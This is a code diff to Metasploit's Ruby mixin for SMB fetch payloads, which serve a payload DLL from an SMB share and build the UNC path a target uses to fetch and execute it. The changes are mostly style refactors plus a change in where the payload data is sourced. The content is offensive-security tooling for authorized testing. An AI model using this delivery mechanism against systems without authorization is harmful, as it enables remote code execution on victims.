@@ -1,16 +1,15 @@
+# Mixin for fetch payloads that retrieve and execute a stage over SMB.
 module Msf::Payload::Adapter::Fetch::SMB
-
   include Msf::Exploit::EXE
   include Msf::Payload::Adapter
   include Msf::Payload::Adapter::Fetch
   include Msf::Payload::Adapter::Fetch::Server::SMB
 
-
   def initialize(*args)
     super
     register_options(
       [
-        Msf::OptString.new('FETCH_FILENAME', [ true, 'Payload file name to fetch; cannot contain spaces or slashes.', 'test.dll'], regex: /^[^\s\/\\]*$/),
+        Msf::OptString.new('FETCH_FILENAME', [ true, 'Payload file name to fetch; cannot contain spaces or slashes.', 'test.dll'], regex: %r{^[^\s/\\]*$}),
       ]
     )
   end
@@ -29,13 +28,14 @@ module Msf::Payload::Adapter::Fetch::SMB
   end
 
   def setup_handler
-    @fetch_service = start_smb_fetch_handler(fetch_bindport, fetch_bindhost, srvuri + "\\#{datastore['FETCH_FILENAME']}", @srvexe)
+    payload_entry = @srv_resources.find { |e| e[:uri] == srvuri }
+    @fetch_service = start_smb_fetch_handler(fetch_bindport, fetch_bindhost, srvuri + "\\#{datastore['FETCH_FILENAME']}", payload_entry&.dig(:data))
     super
   end
 
   def unc
     path = "\\\\#{srvhost}"
-    path << "\\#{srvuri.gsub('/', "\\").chomp("\\")}"
+    path << "\\#{srvuri.gsub('/', '\\').chomp('\\')}"
     path << "\\#{datastore['FETCH_FILENAME']}" if datastore['FETCH_FILENAME'].present?
     path
   end
